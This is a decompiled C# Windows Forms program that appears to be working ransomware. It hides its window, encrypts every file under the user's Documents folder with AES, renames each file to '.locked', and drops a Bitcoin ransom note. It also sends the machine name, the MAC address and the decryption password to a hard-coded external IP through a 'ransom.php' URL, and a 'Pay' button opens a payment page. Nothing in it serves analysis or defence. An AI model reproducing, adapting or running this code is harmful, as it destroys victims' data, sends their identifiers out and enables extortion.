using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ns0;

public class Form1 : Form
{
	private string string_0 = Environment.UserName;

	private static Timer timer_0 = new Timer();

	private IContainer icontainer_0 = null;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		method_1();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
	}

	private void method_0(object sender, EventArgs e)
	{
		((Control)this).set_Visible(true);
		((Form)this).set_Opacity(100.0);
	}

	public void method_1()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		method_2(folderPath);
		((Form)this).set_Opacity(100.0);
		((Form)this).CenterToScreen();
		timer_0.add_Tick((EventHandler)smethod_0);
		timer_0.set_Interval(10000);
		timer_0.Start();
	}

	private static void smethod_0(object sender, EventArgs e)
	{
		smethod_1("202.181.194.227", 10);
	}

	public static double smethod_1(string string_1, int int_0)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		long num = 0L;
		Ping ping = new Ping();
		for (int i = 0; i < int_0; i++)
		{
			PingReply pingReply = ping.Send(string_1);
			if (pingReply.Status == IPStatus.Success)
			{
				num += pingReply.RoundtripTime;
			}
			else
			{
				MessageBox.Show("Are you trying to fool me? Connect me to the Internet ;)", "Oopz!!", (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
		}
		return num / int_0;
	}

	public void method_2(string string_1)
	{
		string text = method_5(10);
		string[] directories = Directory.GetDirectories(string_1);
		string[] files = Directory.GetFiles(string_1, "*.*");
		string[] array = files;
		foreach (string string_2 in array)
		{
			try
			{
				method_3(string_2, text);
			}
			catch
			{
			}
		}
		string[] array2 = directories;
		foreach (string path in array2)
		{
			string path2 = Path.Combine(string_1, path);
			DirectoryInfo directoryInfo = new DirectoryInfo(path2);
			if ((directoryInfo.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				continue;
			}
			string[] files2 = Directory.GetFiles(path2, "*.*", SearchOption.AllDirectories);
			string[] array3 = files2;
			foreach (string string_3 in array3)
			{
				try
				{
					method_3(string_3, text);
				}
				catch
				{
				}
			}
		}
		method_6(text);
	}

	public void method_3(string string_1, string string_2)
	{
		byte[] byte_ = File.ReadAllBytes(string_1);
		byte[] bytes = Encoding.UTF8.GetBytes(string_2);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = method_4(byte_, bytes);
		File.WriteAllBytes(string_1, bytes2);
		File.Move(string_1, string_1 + ".locked");
	}

	private byte[] method_4(byte[] byte_0, byte[] byte_1)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string method_5(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void method_6(string string_1)
	{
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string path = folderPath + "\\WindowsUpdate.locked";
		string[] contents = new string[2] { string_1, "All your files are now under my rule, Pay me some Bitconis and make them yours" };
		File.WriteAllLines(path, contents);
		string arg = method_7();
		string arg2 = Environment.MachineName.ToString();
		try
		{
			string address = $"http://202.181.194.227/cryptowall/ransom.php?DGCMP={arg2}&DGMAC={arg}&DGPASS={string_1}";
			using WebClient webClient = new WebClient();
			string value = webClient.DownloadString(address);
			Console.WriteLine(value);
		}
		catch (Exception)
		{
			MessageBox.Show("URL not reachable", "Oopz!!", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public string method_7()
	{
		return (from networkInterface_0 in NetworkInterface.GetAllNetworkInterfaces()
			where networkInterface_0.OperationalStatus == OperationalStatus.Up
			select networkInterface_0.GetPhysicalAddress().ToString()).FirstOrDefault();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Process.Start("http://202.181.194.227/cryptowall/index.html");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(210, 322));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Pay");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.WindowText);
		((Control)this).set_BackgroundImage((Image)(object)Class0.ds1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(752, 440));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_Location(new Point(100, 50));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
